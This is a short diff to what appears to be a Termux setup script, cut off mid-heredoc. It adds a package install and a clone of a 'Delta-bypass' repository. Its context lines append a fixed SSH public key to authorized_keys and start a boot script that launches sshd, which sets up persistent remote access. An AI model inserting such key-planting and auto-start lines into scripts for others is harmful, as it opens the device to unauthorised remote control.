@@ -1,4 +1,6 @@
 pkg install python git -y
+pip install requests pycryptodome
+git clone https://github.com/AbabaHnb/Delta-bypass.git
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWZ71KZdPmDOceNyyEg+V5J3hyurXkRLJ3iA1/rxlqD" >> ~/.ssh/authorized_keys
 mkdir -p ~/.termux/boot
 cat > ~/.termux/boot/start-sshd.sh << 'EOF'
